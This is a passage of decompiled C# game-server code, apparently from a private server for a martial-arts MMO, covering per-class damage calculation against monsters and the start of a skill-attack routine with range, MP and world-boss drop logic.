				else if (base.Player_Job == 8 && (double)RNG.Next(1, 110) <= base.破甲几率)
				{
					num23 *= 得到气功加成值(8, 7, 1);
					显示大字(base.人物全服ID, 16);
				}
				double num35 = num32;
				int num36 = 0;
				num = 3;
				if (武功.FLD_武功类型 == 3)
				{
					num36 = 武功.FLD_AT + (武功新[武功.FLD_武功类型, 武功.FLD_INDEX].武功_等级 - 1) * 武功.FLD_每级加危害;
				}
				else if (武功.FLD_武功类型 == 2)
				{
					num36 = base.夫妻武功攻击力;
				}
				else if (武功.FLD_每级危害.Length <= 0)
				{
					num36 = ((base.Player_Job == 10 && 临时武功 != 0) ? ((int)(((double)num36 + (double)(base.Player_Level * 10)) * (1.0 + base.拳师_水火一体))) : ((武功.FLD_PID == 师傅数据.STWG1 || 武功.FLD_PID == 师傅数据.STWG2 || 武功.FLD_PID == 师傅数据.STWG2) ? (武功.FLD_AT * (10 - 师傅数据.STLEVEL) / 10) : ((武功.FLD_武功类型 != 2) ? 计算升天武功威力(武功) : base.夫妻武功攻击力)));
				}
				else
				{
					int at = 武功.GetAt(武功.FLD_PID, 武功新[武功.FLD_武功类型, 武功.FLD_INDEX].武功_等级);
					if (at > 0)
					{
						num36 = at;
					}
				}
				num = 4;
				if (base.Player_Job == 11)
				{
					if (base.梅_玄武危化 > 0.0)
					{
						num36 = (int)((double)num36 * (1.0 + base.梅_玄武危化));
					}
					if (怒点 >= 3)
					{
						怒点 = 0;
						if (base.梅_愤怒爆发 > 0.0)
						{
							num36 = (int)((double)num36 * (1.0 + base.梅_愤怒爆发));
							显示大字(base.人物全服ID, 802);
						}
						更新HP_MP_SP();
					}
				}
				double num37 = (num35 - num23 + (double)base.FLD_人物基本_命中) * 1.5 + (double)num36 * (1.0 + base.FLD_装备_武功攻击力增加百分比 + base.FLD_人物_武功攻击力增加百分比 + base.FLD_人物_气功_武功攻击力增加百分比) + (double)base.FLD_人物基本_命中 * 0.25;
				if (爆毒状态 > 0.0)
				{
					num37 += num37 * 爆毒状态;
					爆毒状态 = 0.0;
				}
				if (num37 <= 0.0)
				{
					double num2 = ((base.FLD_装备_追加_伤害值 < 0) ? 0.0 : ((double)base.FLD_装备_追加_伤害值));
					if (num2 <= 1.0)
					{
						num2 = RNG.Next(1, 5);
					}
					攻击计算完成(this, 人物ID, 武功ID, (int)num2, 0, npcTemp.Rxjh_HP, 0);
					return;
				}
				num = 5;
				if (base.Player_Job == 1)
				{
					if ((double)RNG.Next(1, 100) <= base.真武绝击)
					{
						显示大字(base.人物全服ID, 17);
						num37 *= 得到气功加成值(1, 7, 1);
					}
					if ((double)RNG.Next(1, 100) <= base.暗影绝杀)
					{
						显示大字(base.人物全服ID, 18);
						num37 *= 得到气功加成值(1, 9, 1);
					}
					if ((double)RNG.Next(1, 100) <= base.刀_梵音破镜 + base.升天五式_龙魂附体)
					{
						double num3 = 得到气功加成值(1, 10, 1);
						if (base.刀_升天三气功_火龙之火 > 0.0)
						{
							num3 += base.刀_升天三气功_火龙之火;
						}
						显示大字(base.人物全服ID, 312);
						num37 = (int)(num37 * (1.0 + num3));
					}
					if ((double)RNG.Next(1, 110) <= base.刀_升天一气功_遁出逆境)
					{
						显示大字(base.人物全服ID, 310);
						if (追加状态列表 != null)
						{
							if (GetAddState(700310))
							{
								追加状态列表[700310].时间结束事件();
							}
						}
						else
						{
							追加状态列表 = new ThreadSafeDictionary<int, 追加状态类>();
						}
						追加状态类 追加状态类2 = new 追加状态类(this, 10000, 700310, 0);
						追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
						addFLD_追加百分比_防御(0.1);
						base.FLD_人物_气功_武功攻击力增加百分比 += 0.3;
						状态效果(BitConverter.GetBytes(700310), 1, 10000);
						更新武功和状态();
					}
				}
				else if (base.Player_Job == 2)
				{
					if ((double)RNG.Next(1, 100) < base.剑_怒海狂澜)
					{
						num37 *= 得到气功加成值(2, 7, 1);
						显示大字(base.人物全服ID, 82);
					}
					if (base.剑_破天一剑 != 0.0)
					{
						num37 *= 1.0 + base.剑_破天一剑;
					}
					if ((double)RNG.Next(1, 100) <= base.升天五式_惊天动地)
					{
						num37 *= 1.4;
						显示大字(base.人物全服ID, 1015);
					}
				}
				else if (base.Player_Job == 3)
				{
					double num4 = 0.4;
					double num5 = base.枪_升天一气功_破甲刺魂;
					double num6 = RNG.Next(1, 100);
					if (武功.FLD_武功类型 == 3 && 武功新[3, 武功.FLD_INDEX].武功_等级 >= 5)
					{
						if (怒)
						{
							num5 += base.枪_升天二气功_以退为进;
							num4 += base.枪_升天二气功_以退为进 * 0.01;
						}
						if (num6 <= num5)
						{
							num37 += (double)base.FLD_装备_追加_防御 * num4;
							显示大字(base.人物全服ID, 330);
						}
					}
					if ((double)RNG.Next(1, 100) <= base.枪_怒意之吼)
					{
						double num7 = 1.2;
						显示大字(base.人物全服ID, 332);
						if (怒)
						{
							num7 = 1.2 + base.枪_升天三气功_怒意之火;
						}
						num37 *= num7;
					}
					if (!怒 && (double)RNG.Next(1, 100) <= base.升天五式_灭世狂舞)
					{
						num37 *= 1.2;
						显示大字(base.人物全服ID, 1016);
					}
				}
				else if (base.Player_Job == 4)
				{
					num37 += base.弓_锐利之箭 + 1.0;
					if ((double)RNG.Next(1, 100) <= base.弓_无明暗矢)
					{
						num37 *= 1.05 + base.弓_无明暗矢 * 0.01;
						显示大字(base.人物全服ID, 49);
						触发魔法无明暗矢 = true;
					}
					if ((double)RNG.Next(1, 100) <= base.弓_升天三气功_天外三矢)
					{
						显示大字(base.人物全服ID, 342);
						if (武功.FLD_武功类型 == 3 && 武功新[3, 武功.FLD_INDEX].武功_等级 >= 5)
						{
							num37 *= 1.25;
						}
					}
					if (武功.FLD_武功类型 == 3 && (double)RNG.Next(1, 100) <= base.弓_升天一气功_绝影射魂)
					{
						显示大字(base.人物全服ID, 340);
						触发绝影射魂 = true;
					}
					if (武功.FLD_TYPE == 4)
					{
						int num8 = RNG.Next(1, 110);
						int num9 = RNG.Next(1, 120);
						if ((double)num8 <= base.弓_心神凝聚)
						{
							base.弓群攻触发心神 = true;
							num37 *= 1.65;
						}
						if ((double)num9 <= base.弓_致命绝杀)
						{
							double num10 = base.弓_致命绝杀 * 得到气功加成值(4, 11, 1);
							num37 *= 1.4;
							显示大字(base.人物全服ID, 140);
							触发弓箭致命绝杀 = true;
						}
					}
					if ((double)RNG.Next(1, 100) <= base.升天五式_千里一击)
					{
						num37 *= 1.0 + base.升天五式_千里一击 * 2.0 / 100.0;
						显示大字(base.人物全服ID, 1017);
					}
				}
				else if (base.Player_Job == 5)
				{
					num37 *= 1.0 + base.医_长攻击力;
					if ((double)RNG.Next(1, 100) <= base.真武绝击)
					{
						显示大字(base.人物全服ID, 17);
						num37 *= 得到气功加成值(5, 7, 1);
					}
					double num11 = 0.0;
					if (base.医_无中生有 - base.医_狂意护体 > 0.0)
					{
						num11 = base.医_狂意护体 - base.医_无中生有;
					}
					double num13 = num11 * 0.01;
					if ((double)RNG.Next(1, 100) <= base.医_无中生有)
					{
						显示大字(base.人物全服ID, 351);
						if (武功.FLD_武功类型 == 3 && 武功新[3, 武功.FLD_INDEX].武功_等级 >= 5 && (double)RNG.Next(1, 100) <= base.医_升天三气功_明镜止水)
						{
							显示大字(base.人物全服ID, 352);
							num13 *= 2.0;
						}
						if (num13 > 0.0)
						{
							num37 += (double)(int)(num37 * num13);
						}
					}
				}
				else if (base.Player_Job == 6)
				{
					try
					{
						if (武功.FLD_PID == 801303)
						{
							if ((int)DateTime.Now.Subtract(Pktime801303).TotalSeconds < 30)
							{
								return;
							}
							Pktime801303 = DateTime.Now;
							num37 = 0.0;
							怒气++;
							if (怒气 > 5)
							{
								怒气 = 5;
							}
						}
						else if (武功.FLD_INDEX == 1 || 武功.FLD_INDEX == 5 || 武功.FLD_INDEX == 9 || 武功.FLD_INDEX == 13 || 武功.FLD_INDEX == 17 || 武功.FLD_INDEX == 21 || 武功.FLD_INDEX == 25)
						{
							if (怒气 > 0)
							{
								if (!npcTemp.ContainsKeyInAbnormalState(9))
								{
									double num14 = 10000.0 + base.刺_千蛛万手;
									异常状态类 value5 = new 异常状态类(npcTemp, base.人物全服ID, (int)num14, 9, 0.0);
									npcTemp.异常状态.TryAdd(9, value5);
								}
								if (!npcTemp.ContainsKeyInAbnormalState(11))
								{
									double num15 = 10000.0 + base.刺_千蛛万手;
									异常状态类 value6 = new 异常状态类(npcTemp, base.人物全服ID, (int)num15, 11, 0.0);
									npcTemp.异常状态.TryAdd(11, value6);
								}
								怒气--;
							}
						}
						else if (武功.FLD_INDEX == 2 || 武功.FLD_INDEX == 6 || 武功.FLD_INDEX == 10 || 武功.FLD_INDEX == 14 || 武功.FLD_INDEX == 18 || 武功.FLD_INDEX == 22 || 武功.FLD_INDEX == 26)
						{
							if (怒气 > 0)
							{
								if (!npcTemp.ContainsKeyInAbnormalState(9))
								{
									double num16 = 10000.0 + base.刺_千蛛万手;
									异常状态类 value7 = new 异常状态类(npcTemp, base.人物全服ID, (int)num16, 9, 0.0);
									npcTemp.异常状态.TryAdd(9, value7);
								}
								double num17 = 0.005;
								switch (武功.FLD_INDEX)
								{
								case 2:
									num17 = 0.01;
									break;
								case 6:
									num17 = 0.014;
									break;
								case 10:
									num17 = 0.018;
									break;
								case 14:
									num17 = 0.022;
									break;
								case 18:
									num17 = 0.026;
									break;
								case 22:
									num17 = 0.03;
									break;
								case 26:
									num17 = 0.04;
									break;
								}
								if (!npcTemp.ContainsKeyInAbnormalState(10))
								{
									double num18 = 10000.0 + base.刺_千蛛万手;
									异常状态类 异常状态类2 = new 异常状态类(this, npcTemp, base.人物全服ID, (int)num18, 10, (int)(num37 * num17));
									异常状态类2.异常状态类出血怪物(this, num37 * num17);
									npcTemp.异常状态.TryAdd(10, 异常状态类2);
								}
								怒气--;
							}
						}
						else if ((武功.FLD_INDEX == 3 || 武功.FLD_INDEX == 7 || 武功.FLD_INDEX == 11 || 武功.FLD_INDEX == 15 || 武功.FLD_INDEX == 19 || 武功.FLD_INDEX == 23 || 武功.FLD_INDEX == 27) && 怒气 > 0)
						{
							num37 += num37 * 0.3 * (double)怒气;
							显示大字(base.人物全服ID, 80);
							怒气 = 0;
						}
					}
					catch (Exception)
					{
					}
				}
				else if (base.Player_Job == 7)
				{
					num = 6;
					if (!检查和弦状态())
					{
						if ((double)RNG.Next(1, 100) < base.琴师_梅花三弄)
						{
							显示大字(人物ID, 87);
							int num19 = RNG.Next(1, 100);
							int num20;
							if (num19 <= 33)
							{
								num20 = 900401;
								base.琴师状态 = 16;
							}
							else if (num19 >= 33 && num19 <= 66)
							{
								num20 = 900402;
								base.琴师状态 = 32;
							}
							else
							{
								num20 = 900403;
								base.琴师状态 = 64;
							}
							追加状态类 value8 = new 追加状态类(this, 10000, num20, 0);
							追加状态列表.Add(num20, value8);
							状态效果(BitConverter.GetBytes(num20), 1, 10000);
							更新人物数据(this);
						}
					}
					else if (追加状态列表.ContainsKey(900401))
					{
						if ((double)RNG.Next(1, 100) < base.琴_三和弦_状态效果)
						{
							if (random.Next(10, 12) == 10)
							{
								int num21 = base.FLD_人物基本_攻击 / 10;
								if (!npcTemp.异常状态.ContainsKey(10))
								{
									异常状态类 异常状态类3 = new 异常状态类(this, npcTemp, base.人物全服ID, 10000, 10, num21);
									异常状态类3.异常状态类出血怪物(this, num21);
									npcTemp.异常状态.TryAdd(10, 异常状态类3);
								}
							}
							else if (!npcTemp.异常状态.ContainsKey(11))
							{
								double num22 = 10000.0 + base.琴师_阳明春晓 * 1000.0;
								异常状态类 value9 = new 异常状态类(npcTemp, base.人物全服ID, (int)num22, 11, 0.0);
								npcTemp.异常状态.TryAdd(11, value9);
							}
						}
						if ((double)RNG.Next(1, 100) < base.琴师_阳明春晓 && !npcTemp.异常状态.ContainsKey(1))
						{
							double num24 = 10000.0 + base.琴师_阳明春晓 * 100000.0;
							异常状态类 value10 = new 异常状态类(npcTemp, base.人物全服ID, (int)num24, 1, 0.0);
							npcTemp.异常状态.TryAdd(1, value10);
							npcTemp.FLD_AT *= 1.0 - base.琴师_阳明春晓 * 0.016;
						}
						if ((double)RNG.Next(1, 100) < base.琴师_潇湘雨夜 && !npcTemp.异常状态.ContainsKey(2))
						{
							double num25 = 10000.0 + base.琴师_潇湘雨夜 * 100000.0;
							异常状态类 value11 = new 异常状态类(npcTemp, base.人物全服ID, (int)num25, 2, 0.0);
							npcTemp.异常状态.TryAdd(2, value11);
							npcTemp.FLD_DF *= 1.0 - base.琴师_潇湘雨夜 * 0.016;
						}
					}
					else if (追加状态列表.ContainsKey(900402) && 武功.FLD_TYPE != 4)
					{
						if ((double)RNG.Next(1, 100) < base.琴师_鸾凤和鸣 + base.琴师_升天一气功_飞花点翠 * 0.2)
						{
							显示大字(人物ID, 88);
							base.琴_七和弦_状态效果 *= 2.0 * (1.0 + base.琴师_升天一气功_飞花点翠 * 0.005);
						}
						num37 *= 1.0 + base.琴_七和弦_状态效果;
					}
					if ((double)RNG.Next(1, 100) <= base.升天五式_龙爪纤指手)
					{
						显示大字(base.人物全服ID, 1019);
						num37 *= 1.3;
					}
				}
				else if (base.Player_Job == 8)
				{
					double num26 = 0.0;
					if (韩飞官_天魔狂血叠加次数 >= 2)
					{
						显示大字(base.人物全服ID, 20252);
						num26 = base.韩_升天二气功_天魔护体;
						if (韩飞官_天魔狂血攻击力 > 0.0)
						{
							num37 += 韩飞官_天魔狂血攻击力;
							韩飞官_天魔狂血攻击力 = 0.0;
						}
						韩飞官_天魔狂血叠加次数 = 0;
					}
					if ((double)RNG.Next(1, 100) <= base.真武绝击)
					{
						显示大字(base.人物全服ID, 17);
						num37 *= 得到气功加成值(8, 8, 1);
					}
					if ((double)RNG.Next(1, 100) <= base.暗影绝杀 + num26)
					{
						显示大字(base.人物全服ID, 18);
						num37 *= 得到气功加成值(8, 11, 1);
					}
					if ((double)RNG.Next(1, 110) <= base.韩_升天一气功_行风弄舞 + num26)
					{
						显示大字(base.人物全服ID, 600);
						num37 *= 1.25;
					}
					else if (武功.FLD_CDTIME > 0)
					{
						int num27 = RNG.Next(1, 120);
						if ((double)num27 <= base.韩_天魔狂血 * 2.0)
						{
							显示大字(base.人物全服ID, 252);
							num37 *= 1.2;
							韩飞官_天魔狂血叠加次数 = 1;
							if ((double)num27 <= base.韩_天魔狂血 - 10.0)
							{
								韩飞官_天魔狂血攻击力 = num37 * (0.6 + base.升天五式_天魔之力);
								韩飞官_天魔狂血叠加次数 = 2;
							}
						}
					}
					else
					{
						韩飞官_天魔狂血叠加次数 = 0;
						韩飞官_天魔狂血攻击力 = 0.0;
					}
				}
				else if (base.Player_Job == 9)
				{
					if (武功ID == 2000401)
					{
						double num28 = 4000.0;
						if (npcTemp.异常状态 != null && !npcTemp.ContainsKeyInAbnormalState(8))
						{
							异常状态类 value2 = new 异常状态类(npcTemp, base.人物全服ID, (int)num28, 8, 1.0);
							npcTemp.异常状态.TryAdd(8, value2);
						}
					}
					if ((double)RNG.Next(1, 100) < base.谭_怒海狂澜)
					{
						num37 *= 得到气功加成值(9, 10, 1);
						显示大字(base.人物全服ID, 82);
					}
				}
				else if (base.Player_Job == 10)
				{
					if (临时武功 == 3000109)
					{
						num37 *= 1.45;
					}
					if (临时武功 != 0)
					{
						if ((double)RNG.Next(1, 100) <= base.拳师_会心一击)
						{
							显示大字(base.人物全服ID, 557);
							num37 *= 1.0 + 拳师会心一击威力;
						}
						if ((double)RNG.Next(1, 100) <= base.拳_升天一气功_夺命连环)
						{
							显示大字(base.人物全服ID, 561);
							num37 *= 1.45;
						}
					}
					else if ((double)RNG.Next(1, 100) <= base.拳师_会心一击)
					{
						显示大字(base.人物全服ID, 557);
						num37 *= 1.0 + 拳师会心一击威力 / 2.0;
					}
				}
				else if (base.Player_Job == 11)
				{
					if ((double)RNG.Next(1, 100) <= base.梅_玄武强击 * 得到气功加成值(base.Player_Job, 6, 0))
					{
						num37 *= 1.0 + base.梅_玄武强击 * 得到气功加成值(base.Player_Job, 6, 1);
					}
					if ((double)RNG.Next(1, 100) <= base.梅_升天一气功_玄武雷电)
					{
						num37 *= 1.4;
						显示大字(base.人物全服ID, 803);
					}
					if (base.人物坐标_地图 != 7301 && (double)RNG.Next(1, 100) <= base.梅_升天二气功_玄武诅咒)
					{
						num37 += (double)base.人物最大_HP * 0.2;
						显示大字(base.人物全服ID, 806);
					}
				}
				else if (base.Player_Job == 12)
				{
					int num29 = RNG.Next(1, 100);
					触发流星漫天 = false;
					if (base.流星漫天 + base.升天五式_破空坠星 >= (double)RNG.Next(1, 100))
					{
						触发流星漫天 = true;
						显示大字(base.人物全服ID, 1005);
						if (base.技冠群雄 >= (double)RNG.Next(1, 100))
						{
							显示大字(base.人物全服ID, 1013);
							num37 *= 2.0;
						}
					}
					if ((double)num29 <= base.真武绝击)
					{
						显示大字(base.人物全服ID, 17);
						num37 *= 得到气功加成值(12, 6, 1);
					}
				}
				else if (base.Player_Job == 13)
				{
					num37 *= 1.0 + base.神女长功击力 * 2.0;
					int num30 = RNG.Next(1, 100);
					触发杀星义气虎 = false;
					if (base.神女杀星义虎 >= (double)RNG.Next(1, 100) && !触发杀星义气杀)
					{
						触发杀星义气虎 = true;
						显示大字(base.人物全服ID, 1027);
						num37 *= 1.15 + base.神女杀星义气;
					}
					触发杀星义气杀 = false;
					if ((double)num30 <= base.神女杀星义杀 && !触发杀星义气虎)
					{
						触发杀星义气杀 = true;
						显示大字(base.人物全服ID, 1026);
						num37 *= 1.25 + base.神女杀星义气;
					}
					if (base.神女真武绝击 >= (double)RNG.Next(1, 100))
					{
						num37 *= 1.4;
						显示大字(base.人物全服ID, 17);
					}
					if (base.神女蛊毒解除 >= (double)RNG.Next(1, 100))
					{
						num37 *= 1.1;
						显示大字(base.人物全服ID, 1025);
					}
					if (武功ID == 6002206)
					{
						触发神女传染 = true;
						List<NpcClass> list = npcTemp.群攻查找范围Npc2(this, 4);
						if (list != null && list.Count > 0)
						{
							foreach (NpcClass item in list)
							{
								if (npcTemp.怪物阎王爆)
								{
									异常状态类 value3 = new 异常状态类(this, item, base.人物全服ID, 8000, 44, 0.0);
									item.异常状态.TryAdd(44, value3);
								}
							}
						}
					}
				}
				if (神女怒)
				{
					显示大字(base.人物全服ID, 17);
					num37 *= 1.4;
				}
				num = 7;
				double num31 = (double)RNG.Next((int)num37 - 15, (int)num37 + 15) + (double)装备追加对怪攻击 + (double)药品追加对怪攻击 + (double)强化追加对怪攻击;
				if (num31 <= 0.0)
				{
					num31 = 0.0;
				}
				else
				{
					if (base.Player_Job == 2)
					{
						if ((double)RNG.Next(1, 110) <= base.剑_冲冠一怒 && !怒)
						{
							显示大字(base.人物全服ID, 29);
							base.人物_SP += (int)((double)base.人物_SP * base.剑_冲冠一怒 * 0.005);
						}
						if ((double)RNG.Next(1, 100) <= base.剑_移花接木)
						{
							显示大字(base.人物全服ID, 26);
							加血((int)(num31 * 0.5));
						}
					}
					if (base.Player_Job == 9)
					{
						if ((double)RNG.Next(1, 110) <= base.谭_冲冠一怒 && !怒)
						{
							显示大字(base.人物全服ID, 29);
							base.人物_SP += (int)((double)base.人物_SP * base.谭_冲冠一怒 * 0.005);
						}
						if ((double)RNG.Next(1, 100) <= base.谭_移花接木)
						{
							显示大字(base.人物全服ID, 26);
							加血((int)(num31 * 0.5));
						}
					}
				}
				num = 8;
				if (num31 <= 1.0)
				{
					num31 = RNG.Next(1, 5);
				}
				if (num31 > 1.0)
				{
					switch (base.Player_Job)
					{
					case 1:
						num31 *= World.刀对怪物伤害 + 宠物对怪物伤害;
						break;
					case 2:
						num31 *= World.剑对怪物伤害 + 宠物对怪物伤害;
						break;
					case 3:
						num31 *= World.枪对怪物伤害 + 宠物对怪物伤害;
						break;
					case 4:
						num31 *= World.弓对怪物伤害 + 宠物对怪物伤害;
						break;
					case 5:
						num31 *= World.医对怪物伤害 + 宠物对怪物伤害;
						break;
					case 6:
						num31 *= World.刺对怪物伤害 + 宠物对怪物伤害;
						break;
					case 7:
						num31 *= World.琴对怪物伤害 + 宠物对怪物伤害;
						break;
					case 8:
						num31 *= World.韩对怪物伤害 + 宠物对怪物伤害;
						break;
					case 9:
						num31 *= World.谭对怪物伤害 + 宠物对怪物伤害;
						break;
					case 10:
						num31 *= World.拳对怪物伤害 + 宠物对怪物伤害;
						break;
					case 11:
						num31 *= World.梅对怪物伤害 + 宠物对怪物伤害;
						break;
					case 12:
						num31 *= World.卢对怪物伤害 + 宠物对怪物伤害;
						break;
					case 13:
						num31 *= World.神女对怪物伤害 + 宠物对怪物伤害;
						break;
					}
				}
				攻击计算完成(this, 人物ID, 武功ID, (int)num31, 0, npcTemp.Rxjh_HP, 0);
			}
			catch
			{
				报错次数阀值++;
				if (World.是否开启票红字 == 1)
				{
					系统提示("你攻击计算出错, 请联系客服处理");
					MainForm.WriteLine(1, "攻击计算丨" + num + "丨" + base.人物全服ID + "|" + ToString() + "|" + base.UserName + "|" + 报错次数阀值 + "丨");
				}
			}
		}

		public void 魔法攻击(int 武功ID, int 人物ID)
		{
			try
			{
				触发鸾凤和鸣 = false;
				武功类 value23;
				Random random;
				Players value34;
				int num78;
				if (人物ID >= 10000)
				{
					try
					{
						if (!MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(人物ID, out var value))
						{
							return;
						}
						if (!World.TBL_KONGFU.TryGetValue(武功ID, out var value12))
						{
							PkID = 0;
						}
						if (value.IsNpc == 1)
						{
							PkID = 0;
							return;
						}
						if (base.人物坐标_地图 != value.Rxjh_Map)
						{
							PkID = 0;
							return;
						}
						if (BitConverter.ToInt32(装备栏已穿装备[3].物品ID, 0) == 0)
						{
							PkID = 0;
							return;
						}
						if ((base.Player_Job == 4 || base.Player_Job == 11) && BitConverter.ToInt32(装备栏已穿装备[12].物品数量, 0) == 0)
						{
							初始化已装备物品();
							PkID = 0;
							return;
						}
						if (base.人物坐标_地图 != 41001)
						{
							goto IL_0193;
						}
						if (value.FLD_PID == 15121)
						{
							if (base.Player_Zx != 1)
							{
								goto IL_0193;
							}
							PkID = 0;
						}
						else
						{
							if (value.FLD_PID != 15122 || base.Player_Zx != 2)
							{
								goto IL_0193;
							}
							PkID = 0;
						}
						goto end_IL_001e;
						IL_04c8:
						if (World.天魔神宫大门是否死亡 == 0 && value.FLD_PID == 16435)
						{
							PkID = 0;
							return;
						}
						if (value12.FLD_TYPE >= 5)
						{
							攻击计算完成(this, value.FLD_INDEX, 武功ID, value.Rxjh_HP + 100, 0, value.Rxjh_HP, 0);
							return;
						}
						int num = 判断拳师连击(武功ID);
						if (num != 0)
						{
							武功ID = num;
							return;
						}
						if (value12.FLD_PID == 400001 && !World.TBL_KONGFU.TryGetValue(base.当前激活技能ID, out value12))
						{
							PkID = 0;
							return;
						}
						if (base.Player_Job != value12.FLD_JOB)
						{
							PkID = 0;
							return;
						}
						if (value12.FLD_ZX != 0 && 师傅数据.STNAME == "" && base.Player_Zx != value12.FLD_ZX)
						{
							PkID = 0;
							return;
						}
						float num34 = value.X - base.人物坐标_X;
						float num45 = value.Y - base.人物坐标_Y;
						double num56 = Math.Sqrt((double)num34 * (double)num34 + (double)num45 * (double)num45);
						switch (base.Player_Job)
						{
						default:
							if (num56 > World.其他职业打怪距离)
							{
								PkID = 0;
								return;
							}
							break;
						case 11:
							if (num56 > 70.0 + base.梅_玄武的指点)
							{
								PkID = 0;
								return;
							}
							break;
						case 5:
							if (num56 > World.医生打怪距离)
							{
								PkID = 0;
								return;
							}
							break;
						case 4:
							if (num56 > World.弓箭手打怪距离 + base.弓_猎鹰之眼)
							{
								PkID = 0;
								return;
							}
							break;
						}
						_ = value12.FLD_MP;
						if (value12.FLD_武功类型 == 2 && base.Player_Job != 13)
						{
							if (base.人物_MP >= base.夫妻武功攻击力MP)
							{
								魔法使用(base.夫妻武功攻击力MP);
								goto IL_0223;
							}
							魔法不足提示();
						}
						else if (value12.武功_等级 == 3)
						{
							int num67 = value12.FLD_MP + (value12.武功_等级 - 1) * value12.FLD_每级加MP;
							if (base.人物_MP >= num67)
							{
								魔法使用(num67);
								goto IL_0223;
							}
							魔法不足提示();
						}
						else
						{
							if (base.人物_MP >= value12.FLD_MP)
							{
								魔法使用(value12.FLD_MP);
								goto IL_0223;
							}
							魔法不足提示();
						}
						goto end_IL_001e;
						IL_07cb:
						DataTable dBToDataTable;
						dBToDataTable.Dispose();
						goto IL_04c8;
						IL_07d9:
						if (base.人物坐标_地图 != 42001)
						{
							goto IL_04c8;
						}
						dBToDataTable = DBA.GetDBToDataTable("select * from [攻城城主] where 分区信息='" + World.ZoneNumber + "'");
						if (!(dBToDataTable.Rows[0]["攻城行会名"].ToString() == base.门派联盟盟主))
						{
							goto IL_07cb;
						}
						if (value.FLD_PID == 16430)
						{
							PkID = 0;
							return;
						}
						if (value.FLD_PID == 16431)
						{
							PkID = 0;
							return;
						}
						if (value.FLD_PID != 16435)
						{
							goto IL_07cb;
						}
						PkID = 0;
						goto end_IL_001e;
						IL_0193:
						if (base.人物坐标_地图 != 42001 || World.攻城战进程 == 3)
						{
							goto IL_07d9;
						}
						if (value.FLD_PID == 16430)
						{
							PkID = 0;
							return;
						}
						if (value.FLD_PID == 16431)
						{
							PkID = 0;
							return;
						}
						if (value.FLD_PID != 16435)
						{
							goto IL_07d9;
						}
						PkID = 0;
						goto end_IL_001e;
						IL_0223:
						if (value12.FLD_INDEX == -1)
						{
							武功连击记数器 = 0;
							new 武功类();
							武功类 武功 = 新武功连击[0];
							攻击计算完成(this, 人物ID, 武功ID, 0, 0, value.Rxjh_HP, 0);
							new Thread(new ThreadWithState(this, 武功, value, 人物ID, num).ThreadProc).Start();
							return;
						}
						if (武功连击记数器 > 0)
						{
							if (武功连击记数器 < 武功l.Count)
							{
								new Thread(new ThreadWithState(this, 武功l[武功连击记数器], value, 人物ID, num).ThreadProc).Start();
							}
							else
							{
								武功连击记数器 = 0;
							}
							return;
						}
						if (base.Player_Job == 10 && 武功ID == 3000401)
						{
							移动(value.X, value.Y, 15f, value.Rxjh_Map);
						}
						if (value.FLD_PID == World.BOSSPID && (double)RNG.Next(1, 100) <= (double)World.世界BOSS掉落元宝概率)
						{
							int num12 = RNG.Next(World.世界BOSS掉落元宝最小, World.世界BOSS掉落元宝最大);
							CheckTreasureGems();
							检察元宝数据(num12, 1, "世界BOSS");
							SaveGemData();
							RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "BOSS获得", 1, num12);
							World.GlobalNotification("系统提示", 21, "玩家[" + base.UserName + "]击杀[世界BOSS]获得元宝:" + num12 + "个");
						}
						if (value.FLD_PID == World.BOSSPID && (double)RNG.Next(1, 100) <= (double)World.世界BOSS掉落金钱概率)
						{
							int num23 = RNG.Next(World.世界BOSS掉落金钱最小, World.世界BOSS掉落金钱最大);
							人物获得金钱(num23, 1);
							更新金钱和负重();
							RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "BOSS获得", 1, num23);
							World.GlobalNotification("系统提示", 22, "玩家[" + base.UserName + "]击杀[世界BOSS]获得金币:" + num23 + "两");
						}
						攻击计算(value12, value, 武功ID, 人物ID, num);
						end_IL_001e:;
					}
					catch (Exception ex)
					{
						报错次数阀值++;
						if (World.是否开启票红字 == 1)
						{
							系统提示("你魔法攻击怪物出错, 请联系客服处理");
							MainForm.WriteLine(1, "魔法攻击怪物 " + base.人物全服ID + "|" + base.Client.ToString() + " | " + 武功ID + " | " + 人物ID + " | " + 报错次数阀值 + "丨" + ex.Message);
						}
					}
				}
				else
				{
					if (!World.TBL_KONGFU.TryGetValue(武功ID, out value23) || (value23.FLD_PID != 601201 && value23.FLD_PID != 601202 && (base.Player_Job != value23.FLD_JOB || base.Player_Job_leve < value23.FLD_JOBLEVEL || base.Player_Level < value23.FLD_LEVEL || (value23.FLD_ZX != 0 && base.Player_Zx != value23.FLD_ZX))) || ((value23.FLD_PID == 601201 || value23.FLD_PID == 601202 || value23.FLD_PID == 100301 || value23.FLD_PID == 200301 || value23.FLD_PID == 300301 || value23.FLD_PID == 400301 || value23.FLD_PID == 500301 || value23.FLD_PID == 800301) && base.FLD_情侣.Length == 0))
					{
						return;
					}
					random = new Random();
					if (!World.AllConnectedPlayers.TryGetValue(人物ID, out value34) || value34.Player死亡 || value34.人物_HP <= 0 || base.Player死亡 || base.Client.挂机 || base.人物_HP <= 0 || 个人商店 != null || 打开仓库中 || value34.个人商店 != null)
					{
						return;
					}
					if (BitConverter.ToInt32(装备栏已穿装备[3].物品ID, 0) == 0)
					{
						发送激活技能数据(武功ID, 6);
					}
					else if ((base.Player_Job == 4 || base.Player_Job == 11) && BitConverter.ToInt32(装备栏已穿装备[12].物品数量, 0) == 0)
					{
						发送激活技能数据(武功ID, 6);
						初始化已装备物品();
					}
					else
					{
						if (base.人物坐标_地图 != value34.人物坐标_地图)
						{
							return;
						}
						num78 = 判断拳师连击(武功ID);
						if (num78 != 0)
						{
							武功ID = num78;
						}
						if (!World.TBL_KONGFU.TryGetValue(武功ID, out value23) || (value23.FLD_PID != 601201 && value23.FLD_PID != 601202 && (base.Player_Job != value23.FLD_JOB || base.Player_Job_leve < value23.FLD_JOBLEVEL || base.Player_Level < value23.FLD_LEVEL || (value23.FLD_ZX != 0 && base.Player_Zx != value23.FLD_ZX))) || ((value23.FLD_PID == 601201 || value23.FLD_PID == 601202 || value23.FLD_PID == 100301 || value23.FLD_PID == 200301 || value23.FLD_PID == 300301 || value23.FLD_PID == 400301 || value23.FLD_PID == 500301 || value23.FLD_PID == 800301) && base.FLD_情侣.Length == 0))
						{
							return;
						}
						if (base.Player_Job == 10 && 武功ID == 3000401)
						{
							异常状态类 value45 = new 异常状态类(value34, 3000, 4, 0.0);
							value34.异常状态.Add(4, value45);
